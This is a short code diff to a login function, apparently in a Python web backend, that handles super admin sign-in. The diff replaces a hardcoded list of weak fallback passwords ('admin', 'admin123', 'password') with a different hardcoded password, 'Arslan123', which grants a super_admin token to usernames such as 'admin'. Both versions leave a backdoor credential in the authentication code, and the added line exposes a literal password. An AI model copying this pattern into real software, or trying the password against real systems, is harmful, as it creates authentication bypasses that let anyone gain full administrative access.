@@ -22,7 +22,7 @@ def login(
     
     # 1. Check Super Admin Login
     if cleaned_username in ("admin", "superadmin", "admin@platform.com"):
-        if payload.password == settings.ADMIN_SECRET_KEY or payload.password in ("admin", "admin123", "password"):
+        if payload.password == settings.ADMIN_SECRET_KEY or payload.password == "Arslan123":
             token_payload = {
                 "sub": "admin",
                 "role": "super_admin",
